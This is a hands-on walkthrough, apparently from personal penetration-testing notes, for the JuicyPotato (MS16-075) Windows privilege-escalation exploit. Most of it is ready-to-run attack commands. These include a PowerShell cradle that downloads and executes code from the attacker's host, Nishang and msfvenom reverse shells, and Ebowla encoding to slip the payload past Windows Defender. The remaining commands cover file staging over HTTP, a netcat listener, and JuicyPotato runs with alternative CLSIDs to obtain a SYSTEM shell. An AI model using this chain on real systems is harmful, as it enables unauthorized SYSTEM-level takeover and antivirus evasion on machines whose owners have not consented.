| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| MS16-075 | Rotten Potato â€“ Privilege Escalation from Service Accounts to SYSTEM (JuicyPotato) | win_server_2008 sp_2 arc_x64,win_server_2008 sp_1 arc_x64,win_10 arc_x64,win_vista sp_2 arc_x86,win_10 version_1511 arc_x86,win_server_2012 arc_x86,win_7 sp_1 arc_x64,win_10 version_1511 arc_x64,win_server_2008 sp_2 arc_x86,win_10 arc_x86,win_8.1 arc_x86,win_vista sp_2 arc_x64,win_8.1 arc_x64,win_7 sp_1 arc_x86,win_server_2008 sp_1 arc_x86 |

<br><br>


I could not find a relevant CVE for this exploit yet. By the time I learned about this exploit which was originally developed in 2016, there were already many variations of the Potato exploit in 2019 e.g RottenPotatoNG, LonelyPotato, JuicyPotato. <br>I'll be demonstrating JuicyPotato which I think is the most stable and has high success chance among all other Potatoes. <br>The mentioned Affected Systems were auto generated through the MSBulletin link but really the exploit seems to work on any machine where the user has "SeImpersonatePrivilege" or "SeAssignPrimaryTokenPrivilege" Privilege. <br>Check if they are available using command : whoami /priv<br>
<h3>Generating program to run by the JuicyPotato </h3>
Choose either one of these :
<ul>
	<li><a href="#PowerShellTcp">Simple bat script to execute Invoke-PowerShellTcp.ps1</a> (easier)</li>
	<li><a href="#msfbinary">MSF reverse shell backdoor</a> (will need to be encoded on a box with defender active)</li>
</ul>
<h4 id="PowerShellTcp">Simple bat script to execute Invoke-PowerShellTcp.ps1 : </h4>

Download [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) file in local system, edit the file and add this below line at the bottom of the script :

```sh
Invoke-PowerShellTcp -Reverse -IPAddress <Your-Machine-IP> -Port 443
```

create a file named `rev.bat` and add this as its content :

```sh
powershell.exe -c iex(new-object net.webclient).downloadstring('<Your-Machine-IP>:8000/Invoke-PowerShellTcp.ps1')
```

<h4 id="msfbinary">MSF reverse shell backdoor : </h4>
I am demonstrating this POC against a Windows Server 2016 10.0.14393 x64-based OS so if your target is x86-based then change the commands where necessary. <br>First we'll generate a reverse shell backdoor exe using msfvenom : 

```sh
msfvenom -f exe -p windows/x64/shell_reverse_tcp LHOST=<Your-Machine-IP> LPORT=443 -a x64 -o rev.exe

```

<p style="text-align: center;" id="EncodeBinary">- - - - - - - - - -  [OPTIONAL]  - - - - - - - - - -</p>

This binary will be immediately deleted on a windows 10 or server 2016 box if Windows Defender is active. So we can obfuscate the exe by encoding it with a tool named "Ebowla" ( now deprecated but still works! ) to bypass it. Requires Go, Python 2 and Pip

```sh
git clone https://github.com/Genetic-Malware/Ebowla.git
pip install configobj
```

The tool is ready to be used. Now edit the "genetic.config" file inside the Ebowla directory, find and change the following Variables :

```sh
Encryption_Type = ENV
output_type = GO
payload_type = EXE
```

Find the [[ENV_VAR]] section. Set the value of the "computername" variable to the output of "hostname" command on your target machine. Suppose mine is 'tally' so I am putting it like this : 

```sh
username = ''
computername = 'tally'
homepath = ''
homedrive = ''
Number_of_processors = ''
processor_identifier = ''
processor_revision = ''
userdomain = ''
systemdrive = ''
userprofile = ''
path = ''
temp = ''
```

Leave other variables mentioned above blank and rest of the variables default, save and exit.
Now copy the rev.exe file in the Ebowla directory and execute : 

```sh
python ebowla.py rev.exe genetic.config

./build_x64_go.sh output/go_symmetric_rev.exe.go revx.exe
```

This produced an encoded version of the original exe program on output/revx.exe which won't get deleted if the Windows Defender is active on the box.

<p style="text-align: center;">- - - - - - - - - -  [/OPTIONAL]  - - - - - - - - - -</p>

Start a netcat listener on your local machine to receive reverse shell as System later:

```sh
sudo nc -nlvp 443
```

Now download JuicyPotato.exe matching your target:

* [x64 JuicyPotato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
* [x86 JuicyPotato](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

put both JuicyPotato.exe and the rev.bat/revx.exe in a directory and start a python SimpleHTTPServer. change the revx.exe to rev.bat from the below command before executing if you chose the go with the .bat program earlier:

```sh
powershell (New-Object Net.WebClient).DownloadFile('http://<Your-Machine-IP>:8000/JuicyPotato.exe' , 'C:\Users\Public\JuicyPotato.exe')

powershell (New-Object Net.WebClient).DownloadFile('http://<Your-Machine-IP>:8000/revx.exe' , 'C:\Users\Public\revx.exe')

C:\Users\Public\JuicyPotato.exe -t * -l 1337 -p C:\Users\Public\revx.exe

```

If everything went well you should receive a reverse shell connection on your netcat listener now. if the exploit failed and you see something like :

```sh
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: XXXXX
```

Then the default CLSID mentioned in the exploit is not working.<br>
<h4>Finding right CLSID</h4>

* Execute `systeminfo` and get the OS Name, in my case its 'Microsoft Windows 10 Enterprise'
* Go Here : [http://ohpe.it/juicy-potato/CLSID/](http://ohpe.it/juicy-potato/CLSID/)
* Select the Os Name you got, and copy one of the CLSID which is owned by NT AUTHORITY\SYSTEM

<br>and the localservice looks like it should be available in the box by default.
<br><br>

In my case I selected this CLSID {e60687f7-01a1-40aa-86ac-db1cbf673334} which is from the localservice wuauserv (Windows Update Service) for Windows 10 Enterprise.<br><br>
Now execute JuicyPotato.exe again with the CLSID included this time :

```sh
C:\Users\Public\JuicyPotato.exe -t * -l 1337 -p C:\Users\Public\revx.exe -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
```

If everything went well you should receive a reverse shell connection on your netcat listener now. if the exploit failed again this time change the CLSID from one of other from that page and keep trying, one of the CLSID should work and you'll get the reverse shell.
